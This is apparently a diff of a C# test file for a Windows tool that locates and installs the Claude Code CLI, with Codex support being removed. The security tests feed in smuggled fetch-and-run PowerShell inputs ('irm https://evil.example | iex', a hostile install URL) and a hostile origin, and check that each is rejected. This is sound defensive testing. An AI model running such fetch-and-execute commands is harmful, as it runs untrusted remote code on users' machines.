@@ -16,10 +16,7 @@ public sealed class CliResolutionTests
     private const string Npm = Roaming + @"\npm";
     private const string NativeClaude = Home + @"\.local\bin\claude.exe";
     private const string AppRoot = Local + @"\Claude-Data\claude_pzs8sxrjxfjjc\claude-code";
-    private const string CodexInstaller = Local + @"\Programs\OpenAI\Codex\bin\codex.exe";
-    private const string CodexApp = Pf + @"\WindowsApps\OpenAI.Codex_26.1027.3384.0_x64__2p2nqsd0c76g0";
     private const string Anthropic = "Anthropic, PBC";
-    private const string OpenAi = "OpenAI OpCo, LLC";
 
     private readonly HashSet<string> _files = new(StringComparer.OrdinalIgnoreCase) { Bridge };
     private readonly Dictionary<string, List<string>> _dirs = new(StringComparer.OrdinalIgnoreCase);
@@ -49,7 +46,7 @@ public sealed class CliResolutionTests
     private CliLocator Locator => new(Env);
 
     private BridgeDispatcher Dispatcher(IInstallLauncher? launcher = null) =>
-        new(new BridgeRouter(), new NoBackend(), DesktopLog.Disabled,
+        new(new BridgeRouter(), new NoBackend(), AppLog.Disabled,
             clients: new ClientConnector(_runner, Locator, _confirm, Bridge, systemRoot: @"C:\Windows",
                 fileExists: _files.Contains, installer: launcher ?? _launcher, opener: _opener));
 
@@ -89,10 +86,8 @@ public sealed class CliResolutionTests
             ProcessResult r = args switch
             {
                 ["--version"] => new(0, Versions.TryGetValue(cli, out var v) ? v
-                    : Path.GetFileNameWithoutExtension(cli) == "claude" ? "2.1.317 (Claude Code)\n" : "codex-cli 0.167.0-alpha.5.1\n", "", false),
+                    : "2.1.317 (Claude Code)\n", "", false),
                 ["--help"] => new(0, CliHelp.Claude, "", false),
-                ["exec", "--help"] => new(0, CliHelp.Codex, "", false),
-                ["features", "list"] => new(0, CliHelp.CodexFeatures, "", false),
                 ["mcp", "get", _] => new(1, "", "No MCP server found with name: optimization-tool\n", false),
                 _ => new(2, "", "", false),
             };
@@ -128,8 +123,8 @@ public sealed class CliResolutionTests
     {
         _fresh = @"C:\New";
         _process = @"C:\Old;C:\New\";
-        _files.UnionWith([@"C:\New\codex.exe", @"C:\Old\codex.exe"]);
-        Assert.Equal([@"C:\New\codex.exe", @"C:\Old\codex.exe"], Locator.Candidates("codex").Select(c => c.Path));
+        _files.UnionWith([@"C:\New\claude.exe", @"C:\Old\claude.exe"]);
+        Assert.Equal([@"C:\New\claude.exe", @"C:\Old\claude.exe"], Locator.Candidates("claude_code").Select(c => c.Path));
         Assert.Equal([@"C:\New", @"C:\Old"], SystemPath.Directories(_fresh, _process));
     }
 
@@ -165,21 +160,6 @@ public sealed class CliResolutionTests
         Assert.Equal(
             [(NativeClaude, "installer"), (Npm + @"\claude.cmd", "npm"), (winget, "winget"), (wingetMachine, "winget"), (wingetPkg, "winget"), (app, "app")],
             Locator.Candidates("claude_code").Select(c => (c.Path, c.Source)));
-    }
-
-    [Fact]
-    public void Codex_known_locations_in_order()
-    {
-        _packages[CliLocator.CodexAppFamily] = CodexApp;
-        var winget = Local + @"\Microsoft\WinGet\Links\codex.exe";
-        var app = CodexApp + @"\app\resources\codex.exe";
-        var sandbox = Home + @"\.codex\.sandbox-bin\codex.exe";
-        foreach (var f in new[] { CodexInstaller, winget, app, sandbox }) { _files.Add(f); _publishers[f] = OpenAi; }
-        _files.Add(Npm + @"\codex.cmd");
-
-        Assert.Equal(
-            [(Npm + @"\codex.cmd", "npm"), (CodexInstaller, "installer"), (winget, "winget"), (app, "app"), (sandbox, "app")],
-            Locator.Candidates("codex").Select(c => (c.Path, c.Source)));
     }
 
     [Fact]
@@ -233,24 +213,6 @@ public sealed class CliResolutionTests
         Assert.Empty(Locator.Candidates("claude_code"));
     }
 
-    [Fact]
-    public void Codex_exe_signed_by_another_publisher_is_rejected()
-    {
-        _files.Add(CodexInstaller);
-        _publishers[CodexInstaller] = Anthropic;
-        Assert.Empty(Locator.Candidates("codex"));
-        _publishers[CodexInstaller] = OpenAi;
-        Assert.Equal("installer", Assert.Single(Locator.Candidates("codex")).Source);
-    }
-
-    [Fact]
-    public void On_path_an_unsigned_exe_is_still_a_candidate_for_the_identity_check()
-    {
-        _fresh = @"C:\Tools";
-        _files.Add(@"C:\Tools\codex.exe");
-        Assert.Equal("path", Assert.Single(Locator.Candidates("codex")).Source);
-    }
-
     [Theory]
     [InlineData(Npm + @"\claude.cmd", true)]
     [InlineData(Npm + @"\CLAUDE.CMD", true)]
@@ -285,15 +247,15 @@ public sealed class CliResolutionTests
     }
 
     [Theory]
-    [InlineData("codex 1.0\n")]
+    [InlineData("claude 1.0\n")]
     [InlineData("2.1.317\n")]
     [InlineData("")]
-    public async Task Codex_identity_requires_codex_cli(string output)
+    public async Task Claude_identity_requires_the_claude_code_marker(string output)
     {
         _fresh = @"C:\Tools";
-        _files.Add(@"C:\Tools\codex.exe");
-        _runner.Versions[@"C:\Tools\codex.exe"] = output;
-        var r = await Status(Dispatcher(), "codex");
+        _files.Add(@"C:\Tools\claude.exe");
+        _runner.Versions[@"C:\Tools\claude.exe"] = output;
+        var r = await Status(Dispatcher(), "claude_code");
         Assert.False(r["installed"]!.GetValue<bool>());
     }
 
@@ -326,9 +288,6 @@ public sealed class CliResolutionTests
         _packages.Clear();
         _files.Add(Local + @"\AnthropicClaude\claude.exe"); // older non-Store installer
         Assert.True((await Status(Dispatcher(), "claude_code"))["app"]!.GetValue<bool>());
-
-        _packages[CliLocator.CodexAppFamily] = CodexApp; // codex never reports app
-        Assert.Null((await Status(Dispatcher(), "codex"))["app"]);
     }
 
     [Fact]
@@ -348,13 +307,13 @@ public sealed class CliResolutionTests
     public async Task Open_starts_the_resolved_cli_with_the_fixed_question_and_no_confirm()
     {
         _fresh = @"C:\Tools\it's";
-        _files.Add(@"C:\Tools\it's\codex.exe");
-        var r = (await Call(Dispatcher(), "shell.openClient", "codex"))["result"]!;
+        _files.Add(@"C:\Tools\it's\claude.exe");
+        var r = (await Call(Dispatcher(), "shell.openClient", "claude_code"))["result"]!;
         Assert.Equal("""{"status":"opened"}""", r.ToJsonString());
         Assert.Empty(_confirm.Shown);
         var started = Assert.Single(_opener.Started);
         Assert.Equal(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", started.FileName);
-        Assert.Equal(["-NoProfile", "-NoExit", "-Command", @"& 'C:\Tools\it''s\codex.exe' 'Use Optimus to check my PC.'"], started.ArgumentList);
+        Assert.Equal(["-NoProfile", "-NoExit", "-Command", @"& 'C:\Tools\it''s\claude.exe' 'Use Optimus to check my PC.'"], started.ArgumentList);
         Assert.Empty(_launcher.Started);
     }
 
@@ -363,9 +322,9 @@ public sealed class CliResolutionTests
     {
         Assert.Equal("""{"status":"not_installed"}""", (await Call(Dispatcher(), "shell.openClient", "claude_code"))["result"]!.ToJsonString());
         _fresh = @"C:\Tools";
-        _files.Add(@"C:\Tools\codex.exe");
+        _files.Add(@"C:\Tools\claude.exe");
         _opener.Fails = true;
-        Assert.Equal("""{"status":"failed","error":"start_failed"}""", (await Call(Dispatcher(), "shell.openClient", "codex"))["result"]!.ToJsonString());
+        Assert.Equal("""{"status":"failed","error":"start_failed"}""", (await Call(Dispatcher(), "shell.openClient", "claude_code"))["result"]!.ToJsonString());
         Assert.Contains("shell.openClient", (IReadOnlySet<string>)BridgeRouter.ShellMethods);
         Assert.DoesNotContain("shell.openClient", (IReadOnlySet<string>)BridgeRouter.DesktopMethods);
     }
@@ -374,7 +333,6 @@ public sealed class CliResolutionTests
 
     [Theory]
     [InlineData("claude_code", "Install Claude Code?", "irm https://claude.ai/install.ps1 | iex")]
-    [InlineData("codex", "Install Codex?", "irm https://chatgpt.com/codex/install.ps1 | iex")]
     public async Task Install_confirms_then_starts_the_fixed_powershell_command(string client, string title, string script)
     {
         var r = (await Call(Dispatcher(), "shell.installClient", client))["result"]!;
@@ -397,7 +355,7 @@ public sealed class CliResolutionTests
     public async Task Install_cancel_starts_nothing()
     {
         _confirm.Answer = false;
-        Assert.Equal("""{"status":"cancelled"}""", (await Call(Dispatcher(), "shell.installClient", "codex"))["result"]!.ToJsonString());
+        Assert.Equal("""{"status":"cancelled"}""", (await Call(Dispatcher(), "shell.installClient", "claude_code"))["result"]!.ToJsonString());
         Assert.Empty(_launcher.Started);
     }
 
@@ -405,12 +363,12 @@ public sealed class CliResolutionTests
     public async Task Install_one_at_a_time_and_failures()
     {
         _launcher.Running = true;
-        Assert.Equal("""{"status":"failed","error":"already_running"}""", (await Call(Dispatcher(), "shell.installClient", "codex"))["result"]!.ToJsonString());
+        Assert.Equal("""{"status":"failed","error":"already_running"}""", (await Call(Dispatcher(), "shell.installClient", "claude_code"))["result"]!.ToJsonString());
         Assert.Empty(_confirm.Shown);
 
         _launcher.Running = false;
         _launcher.Fails = true;
-        Assert.Equal("""{"status":"failed","error":"start_failed"}""", (await Call(Dispatcher(), "shell.installClient", "codex"))["result"]!.ToJsonString());
+        Assert.Equal("""{"status":"failed","error":"start_failed"}""", (await Call(Dispatcher(), "shell.installClient", "claude_code"))["result"]!.ToJsonString());
     }
 
     [Fact]
@@ -418,13 +376,14 @@ public sealed class CliResolutionTests
     {
         var gate = new TaskCompletionSource<bool>();
         var slow = new SlowConfirm(gate.Task);
-        var d = new BridgeDispatcher(new BridgeRouter(), new NoBackend(), DesktopLog.Disabled,
+        var d = new BridgeDispatcher(new BridgeRouter(), new NoBackend(), AppLog.Disabled,
             clients: new ClientConnector(_runner, Locator, slow, Bridge, systemRoot: @"C:\Windows", fileExists: _files.Contains, installer: _launcher));
         var first = Call(d, "shell.installClient", "claude_code");
-        var second = await Call(d, "shell.installClient", "codex");
+        var second = await Call(d, "shell.installClient", "claude_code");
         Assert.Equal("busy", second["error"]!["data"]!["reason"]!.GetValue<string>());
         // Status checks are not blocked by the install confirm.
-        Assert.False((await Status(d, "codex"))["installed"]!.GetValue<bool>());
+        Assert.False((await Status(d, "claude_code"))["installed"]!.GetValue<bool>());
+
         gate.SetResult(true);
         Assert.Equal("started", (await first)["result"]!["status"]!.GetValue<string>());
         Assert.Single(_launcher.Started);
@@ -437,9 +396,9 @@ public sealed class CliResolutionTests
 
     [Theory]
     [InlineData("""{"client":"claude"}""")]
-    [InlineData("""{"client":"codex","command":"irm https://evil.example | iex"}""")]
-    [InlineData("""{"client":"codex","url":"https://evil.example/install.ps1"}""")]
-    [InlineData("""{"client":["codex"]}""")]
+    [InlineData("""{"client":"claude_code","command":"irm https://evil.example | iex"}""")]
+    [InlineData("""{"client":"claude_code","url":"https://evil.example/install.ps1"}""")]
+    [InlineData("""{"client":["claude_code"]}""")]
     [InlineData("{}")]
     [InlineData("null")]
     public async Task Install_rejects_bad_params(string paramsJson)
@@ -456,7 +415,7 @@ public sealed class CliResolutionTests
     {
         Assert.Contains("shell.installClient", (IReadOnlySet<string>)BridgeRouter.ShellMethods);
         Assert.DoesNotContain("shell.installClient", (IReadOnlySet<string>)BridgeRouter.DesktopMethods);
-        const string msg = """{"type":"rpc","id":1,"method":"shell.installClient","params":{"client":"codex"}}""";
+        const string msg = """{"type":"rpc","id":1,"method":"shell.installClient","params":{"client":"claude_code"}}""";
         Assert.Null(await Dispatcher().HandleAsync(msg, Doc, isTopLevel: false, default));
         Assert.Null(await Dispatcher().HandleAsync(msg, "https://evil.example/", isTopLevel: true, default));
         Assert.Empty(_launcher.Started);
@@ -465,14 +424,14 @@ public sealed class CliResolutionTests
     [Fact]
     public void Installer_console_is_visible_unelevated_and_not_redirected()
     {
-        var command = new ClientConnector(_runner, Locator, _confirm, Bridge, systemRoot: @"C:\Windows").InstallCommandFor("codex");
+        var command = new ClientConnector(_runner, Locator, _confirm, Bridge, systemRoot: @"C:\Windows").InstallCommandFor("claude_code");
         var psi = ConsoleInstallLauncher.BuildStartInfo(command, @"C:\Fresh;C:\Old");
         Assert.False(psi.UseShellExecute);
         Assert.False(psi.CreateNoWindow);
         Assert.False(psi.RedirectStandardInput || psi.RedirectStandardOutput || psi.RedirectStandardError);
         Assert.Equal("", psi.Verb);
         Assert.Equal(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", psi.FileName);
-        Assert.Equal(["-NoProfile", "-ExecutionPolicy", "Bypass", "-NoExit", "-Command", "irm https://chatgpt.com/codex/install.ps1 | iex"], psi.ArgumentList);
+        Assert.Equal(["-NoProfile", "-ExecutionPolicy", "Bypass", "-NoExit", "-Command", "irm https://claude.ai/install.ps1 | iex"], psi.ArgumentList);
         Assert.Equal(@"C:\Fresh;C:\Old", psi.Environment["PATH"]);
     }
 
@@ -512,7 +471,7 @@ public sealed class CliResolutionTests
     }
 }
 
-/// <summary>Read-only check on the real PC: resolves both CLIs (runs --version and mcp get only).</summary>
+/// <summary>Read-only check on the real PC: resolves the Claude Code CLI (runs --version and mcp get only).</summary>
 public sealed class CliResolutionLiveTests(Xunit.Abstractions.ITestOutputHelper output)
 {
     private sealed class Yes : IClientConfirmPrompt
@@ -527,13 +486,13 @@ public sealed class CliResolutionLiveTests(Xunit.Abstractions.ITestOutputHelper 
 
     [Fact]
     [Trait("Category", "Live")]
-    public async Task Resolves_both_clis_on_this_pc()
+    public async Task Resolves_the_cli_on_this_pc()
     {
-        foreach (var client in new[] { "claude_code", "codex" })
+        foreach (var client in new[] { "claude_code" })
         {
             foreach (var c in CliLocator.System.Candidates(client)) output.WriteLine($"{client} candidate: {c.Source} {c.Path}");
             var connector = new ClientConnector(new ProcessRunner(), CliLocator.System, new Yes(), ClientConnector.DefaultBridgePath);
-            var d = new BridgeDispatcher(new BridgeRouter(), new NoBackend(), DesktopLog.Disabled, clients: connector);
+            var d = new BridgeDispatcher(new BridgeRouter(), new NoBackend(), AppLog.Disabled, clients: connector);
             var reply = await d.HandleAsync(
                 $$$"""{"type":"rpc","id":1,"method":"shell.clientStatus","params":{"client":"{{{client}}}"}}""",
                 "https://app.optimizationtool.invalid/index.html", true, default);
